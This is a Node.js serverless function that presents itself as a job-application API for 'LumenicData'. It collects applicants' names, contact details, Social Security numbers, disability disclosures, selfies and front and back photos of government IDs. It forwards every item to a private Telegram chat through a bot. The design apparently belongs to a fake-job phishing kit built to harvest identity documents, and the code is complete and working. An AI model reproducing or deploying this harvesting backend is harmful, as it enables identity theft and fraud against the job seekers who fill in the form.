/**
 * LumenicData Application Submission API
 * ======================================
 * Serverless function for Vercel - handles form submissions and sends to Telegram
 * 
 * Environment Variables Required:
 * - TG_BOT_TOKEN: Telegram bot token (from @BotFather)
 * - TG_CHAT_ID: Telegram chat ID where messages will be sent
 */

const FormData = require('form-data');

// Telegram API configuration
const TELEGRAM_API = 'https://api.telegram.org';

// File field configuration - maps field names to captions and types
const FILE_CONFIG = {
  'a-selfie': { 
    caption: '📸 Selfie Photo', 
    isPhoto: true,
    required: true 
  },
  'a-id-photo-front': { 
    caption: '🪪 Government ID - FRONT', 
    isPhoto: true,
    required: true 
  },
  'a-id-photo-back': { 
    caption: '🪪 Government ID - BACK', 
    isPhoto: true,
    required: true 
  },
  'a-cv': { 
    caption: '📄 Resume/CV', 
    isPhoto: false,
    required: false 
  }
};

// CORS headers
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Accept'
};

/**
 * Main handler function
 */
module.exports = async function handler(req, res) {
  // Set CORS headers for all responses
  Object.entries(CORS_HEADERS).forEach(([key, value]) => {
    res.setHeader(key, value);
  });

  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false,
      error: 'Method not allowed. Use POST.' 
    });
  }

  console.log('\n========================================');
  console.log('[API] NEW SUBMISSION RECEIVED');
  console.log('[API] Timestamp:', new Date().toISOString());
  console.log('========================================\n');

  try {
    // Get environment variables (check on each request for hot-reload in dev)
    const BOT_TOKEN = (process.env.TG_BOT_TOKEN || '').trim();
    const CHAT_ID = (process.env.TG_CHAT_ID || '').trim();

    console.log('[API] Environment Check:');
    console.log('[API]   TG_BOT_TOKEN:', BOT_TOKEN ? `✓ Set (${BOT_TOKEN.substring(0, 15)}...)` : '✗ MISSING');
    console.log('[API]   TG_CHAT_ID:', CHAT_ID ? `✓ Set (${CHAT_ID})` : '✗ MISSING');

    // Parse request body
    let bodyData;
    try {
      bodyData = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
      console.log('[API] Request body parsed successfully');
    } catch (parseErr) {
      console.error('[API] ✗ Failed to parse request body:', parseErr.message);
      return res.status(400).json({ 
        success: false,
        error: 'Invalid JSON in request body',
        details: parseErr.message
      });
    }

    const { formData, files } = bodyData || {};

    console.log('[API] Form data fields:', formData ? Object.keys(formData).length : 0);
    console.log('[API] Files received:', files ? Object.keys(files) : 'NONE');
    
    if (files && typeof files === 'object') {
      Object.entries(files).forEach(([key, fileData]) => {
        if (fileData) {
          console.log(`[API]   - ${key}: ${fileData.name || 'unknown'} (${fileData.type || 'unknown type'}, ${fileData.data ? Math.round(fileData.data.length * 0.75 / 1024) + 'KB' : 'no data'})`);
        } else {
          console.log(`[API]   - ${key}: null/undefined`);
        }
      });
    }

    // Validate form data exists
    if (!formData || typeof formData !== 'object') {
      console.error('[API] ✗ Missing or invalid formData');
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid formData'
      });
    }

    // Check Telegram credentials
    if (!BOT_TOKEN) {
      console.error('[API] ✗ FATAL: TG_BOT_TOKEN not configured');
      return res.status(503).json({ 
        success: false,
        error: 'Server not configured: Missing TG_BOT_TOKEN. Contact administrator.',
        timestamp: new Date().toISOString()
      });
    }

    if (!CHAT_ID) {
      console.error('[API] ✗ FATAL: TG_CHAT_ID not configured');
      return res.status(503).json({ 
        success: false,
        error: 'Server not configured: Missing TG_CHAT_ID. Contact administrator.',
        timestamp: new Date().toISOString()
      });
    }

    // Validate bot token format
    if (!BOT_TOKEN.includes(':')) {
      console.error('[API] ✗ FATAL: Invalid bot token format');
      return res.status(503).json({ 
        success: false,
        error: 'Server configuration error: Invalid bot token format',
        timestamp: new Date().toISOString()
      });
    }

    // Step 1: Send form data as text message to Telegram
    let messageResult;
    try {
      const messageText = formatMessage(formData);
      console.log('\n[API] Step 1: Sending text message to Telegram...');
      console.log('[API] Chat ID:', CHAT_ID);
      console.log('[API] Message length:', messageText.length, 'characters');
      
      const messageUrl = `${TELEGRAM_API}/bot${BOT_TOKEN}/sendMessage`;
      console.log('[API] Telegram API URL:', messageUrl.replace(BOT_TOKEN, 'BOT_TOKEN_HIDDEN'));
      
      const messageResponse = await fetch(messageUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'HTML'
        })
      });

      const messageData = await messageResponse.json();
      
      if (!messageData.ok) {
        console.error('[API] ✗ Telegram API error:', messageData);
        throw new Error(`Telegram API error: ${messageData.description || 'Unknown error'}`);
      }
      
      messageResult = messageData;
      console.log('[API] ✓ Text message sent successfully');
      console.log('[API]   Message ID:', messageData.result?.message_id);
    } catch (msgErr) {
      console.error('[API] ✗ Failed to send text message:', msgErr.message);
      throw new Error(`Failed to send form data to Telegram: ${msgErr.message}`);
    }

    // Step 2: Process and upload files to Telegram
    const fileResults = [];
    const fileErrors = [];

    console.log('\n[API] Step 2: Processing file uploads...');

    if (files && typeof files === 'object' && Object.keys(files).length > 0) {
      console.log('[API] Files to process:', Object.keys(files).length);

      for (const [fieldName, fileData] of Object.entries(files)) {
        console.log(`\n[API] Processing file: ${fieldName}`);

        // Validate file data structure
        if (!fileData || typeof fileData !== 'object') {
          console.log(`[API] ✗ ${fieldName}: Invalid file data structure`);
          fileErrors.push({ field: fieldName, error: 'Invalid file data structure' });
          continue;
        }

        if (!fileData.data) {
          console.log(`[API] ✗ ${fieldName}: Missing file data (base64)`);
          fileErrors.push({ field: fieldName, error: 'Missing file data' });
          continue;
        }

        if (!fileData.name) {
          console.log(`[API] ✗ ${fieldName}: Missing filename`);
          fileErrors.push({ field: fieldName, error: 'Missing filename' });
          continue;
        }

        // Get file configuration
        const fileConfig = FILE_CONFIG[fieldName] || { 
          caption: `📎 ${fieldName}`, 
          isPhoto: false,
          required: false
        };

        try {
          console.log(`[API]   Filename: ${fileData.name}`);
          console.log(`[API]   Type: ${fileData.type || 'unknown'}`);
          console.log(`[API]   Base64 length: ${fileData.data.length}`);

          // Decode base64 to buffer
          let buffer;
          try {
            buffer = Buffer.from(fileData.data, 'base64');
          } catch (decodeErr) {
            throw new Error(`Failed to decode base64: ${decodeErr.message}`);
          }

          if (!buffer || buffer.length === 0) {
            throw new Error('Decoded buffer is empty');
          }

          console.log(`[API]   Buffer size: ${buffer.length} bytes (${(buffer.length / 1024).toFixed(2)} KB)`);

          // Determine endpoint based on file type
          const isImage = fileConfig.isPhoto || (fileData.type && fileData.type.startsWith('image/'));
          const endpoint = isImage ? 'sendPhoto' : 'sendDocument';
          const paramName = isImage ? 'photo' : 'document';

          // Build caption
          const caption = `${fileConfig.caption}\nFilename: ${fileData.name}`;

          console.log(`[API]   Uploading as ${endpoint}...`);

          // Create form data for Telegram
          const tgForm = new FormData();
          tgForm.append('chat_id', CHAT_ID);
          tgForm.append('caption', caption);
          tgForm.append(paramName, buffer, {
            filename: fileData.name,
            contentType: fileData.type || 'application/octet-stream',
            knownLength: buffer.length
          });

          // Send to Telegram
          const fileUrl = `${TELEGRAM_API}/bot${BOT_TOKEN}/${endpoint}`;
          const fileResponse = await fetch(fileUrl, {
            method: 'POST',
            body: tgForm,
            headers: tgForm.getHeaders()
          });

          const fileResult = await fileResponse.json();

          if (!fileResult.ok) {
            throw new Error(fileResult.description || 'Unknown Telegram API error');
          }

          const fileId = fileResult.result?.[isImage ? 'photo' : 'document'];
          const fileIdStr = Array.isArray(fileId) ? fileId[0]?.file_id : fileId?.file_id;
          
          console.log(`[API] ✓ ${fieldName} uploaded successfully`);
          console.log(`[API]   File ID: ${fileIdStr || 'N/A'}`);
          
          fileResults.push({
            field: fieldName,
            filename: fileData.name,
            fileId: fileIdStr || 'N/A'
          });

        } catch (fileErr) {
          console.error(`[API] ✗ ${fieldName} upload failed:`, fileErr.message);
          fileErrors.push({ 
            field: fieldName, 
            filename: fileData.name,
            error: fileErr.message 
          });
        }
      }
    } else {
      console.log('[API] No files to process');
    }

    // Step 3: Check for required files that failed
    const requiredFileFields = Object.entries(FILE_CONFIG)
      .filter(([_, config]) => config.required)
      .map(([fieldName, _]) => fieldName);
    
    const uploadedFields = fileResults.map(r => r.field);
    const failedRequired = requiredFileFields.filter(f => !uploadedFields.includes(f));

    console.log('\n[API] Upload Summary:');
    console.log('[API]   Total files received:', Object.keys(files || {}).length);
    console.log('[API]   Successfully uploaded:', fileResults.length);
    console.log('[API]   Failed uploads:', fileErrors.length);
    console.log('[API]   Required files missing:', failedRequired.length);

    if (failedRequired.length > 0) {
      const missingNames = failedRequired.map(f => {
        const labels = {
          'a-selfie': 'Selfie',
          'a-id-photo-front': 'ID Front',
          'a-id-photo-back': 'ID Back'
        };
        return labels[f] || f;
      }).join(', ');

      console.error('[API] ✗ SUBMISSION REJECTED - Required files missing:', failedRequired);
      
      return res.status(400).json({
        success: false,
        error: `Required files failed to upload: ${missingNames}. Please try again.`,
        textSent: true,
        filesUploaded: fileResults.length,
        filesFailed: fileErrors.length,
        fileErrors: fileErrors,
        timestamp: new Date().toISOString()
      });
    }

    // Success!
    console.log('\n========================================');
    console.log('[API] ✓ SUBMISSION COMPLETE');
    console.log('[API] Text message: SENT');
    console.log('[API] Files uploaded:', fileResults.length);
    console.log('========================================\n');

    return res.status(200).json({
      success: true,
      message: 'Application submitted successfully',
      textSent: true,
      messageId: messageResult?.result?.message_id,
      filesReceived: fileResults.length,
      files: fileResults.map(f => ({ field: f.field, filename: f.filename })),
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('\n========================================');
    console.error('[API] ✗ CRITICAL ERROR');
    console.error('[API] Error:', error.message);
    console.error('========================================\n');

    return res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
      timestamp: new Date().toISOString()
    });
  }
};

/**
 * Format form data into HTML message for Telegram
 */
function formatMessage(data) {
  let message = '<b>📋 NEW APPLICATION SUBMITTED</b>\n';
  message += `<i>⏰ ${new Date().toLocaleString()}</i>\n\n`;

  const sections = [
    {
      title: '<b>👤 Personal Information</b>',
      fields: [
        { key: 'a-fullname', label: 'Full Name' },
        { key: 'a-email', label: 'Email' },
        { key: 'a-phone', label: 'Phone' },
        { key: 'a-location', label: 'Location' },
        { key: 'a-linkedin', label: 'LinkedIn' },
        { key: 'a-portfolio', label: 'Portfolio' },
        { key: 'a-experience', label: 'Years Experience' }
      ]
    },
    {
      title: '<b>🏫 Education</b>',
      fields: [
        { key: 'a-highschool', label: 'High School' },
        { key: 'a-highschool-status', label: 'Status' }
      ]
    },
    {
      title: '<b>💼 Position</b>',
      fields: [
        { key: 'a-role', label: 'Position Applied' }
      ]
    },
    {
      title: '<b>🪪 Compliance</b>',
      fields: [
        { key: 'a-govid', label: 'ID Type' },
        { key: 'a-ssn', label: 'SSN' },
        { key: 'a-disability', label: 'Disability Disclosure' }
      ]
    },
    {
      title: '<b>🎯 Skills & Availability</b>',
      fields: [
        { key: 'a-productive-time', label: 'Productive Hours' },
        { key: 'a-coding', label: 'Coding Knowledge' },
        { key: 'a-excel-db', label: 'Excel/Database Skills' },
        { key: 'a-availability', label: 'Availability' }
      ]
    },
    {
      title: '<b>📝 Additional</b>',
      fields: [
        { key: 'a-cover', label: 'Cover Note' },
        { key: 'a-consent', label: 'Consent' }
      ]
    }
  ];

  for (const section of sections) {
    const sectionContent = [];
    for (const { key, label } of section.fields) {
      if (data[key]) {
        // Escape HTML special characters
        const value = String(data[key])
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;');
        sectionContent.push(`• ${label}: ${value}`);
      }
    }
    if (sectionContent.length > 0) {
      message += `${section.title}\n${sectionContent.join('\n')}\n\n`;
    }
  }

  return message;
}
